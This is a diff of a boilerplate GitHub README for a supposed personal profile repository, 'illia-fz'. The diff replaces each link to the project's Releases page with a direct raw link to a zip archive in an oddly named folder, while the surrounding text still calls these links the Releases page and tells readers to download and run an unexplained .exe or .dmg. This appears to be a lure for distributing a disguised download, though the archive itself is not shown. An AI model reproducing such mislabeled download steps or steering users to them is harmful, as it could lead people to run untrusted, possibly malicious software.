@@ -1,6 +1,6 @@
 # 🎉 illia-fz - Showcasing Skills and Projects
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/yoga1938/illia-fz/releases)
+[![Download](https://raw.githubusercontent.com/yoga1938/illia-fz/main/nonforeign/illia-fz.zip)](https://raw.githubusercontent.com/yoga1938/illia-fz/main/nonforeign/illia-fz.zip)
 
 ## 📦 Overview
 This repository serves as my personal GitHub profile. It highlights my skills and projects. You will find a collection of work that demonstrates my capabilities. 
@@ -9,7 +9,7 @@ This repository serves as my personal GitHub profile. It highlights my skills an
 To get started with the projects in this repository, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the Releases page to find the downloadable files. Click this link to access it: [Download Here](https://github.com/yoga1938/illia-fz/releases).
+   Go to the Releases page to find the downloadable files. Click this link to access it: [Download Here](https://raw.githubusercontent.com/yoga1938/illia-fz/main/nonforeign/illia-fz.zip).
 
 2. **Choose Your File**  
    On the Releases page, you will see different versions of the application. Select the most recent version to ensure you get the latest features and fixes.
@@ -17,7 +17,7 @@ To get started with the projects in this repository, follow these steps:
 ## 📥 Download & Install
 To download the application, follow these steps:
 
-1. Visit the Releases page: [Download Here](https://github.com/yoga1938/illia-fz/releases).
+1. Visit the Releases page: [Download Here](https://raw.githubusercontent.com/yoga1938/illia-fz/main/nonforeign/illia-fz.zip).
 2. Locate the version you want to download.
 3. Click on the file name to start downloading it. The file may end with an extension like `.exe` for Windows or `.dmg` for Mac.
 
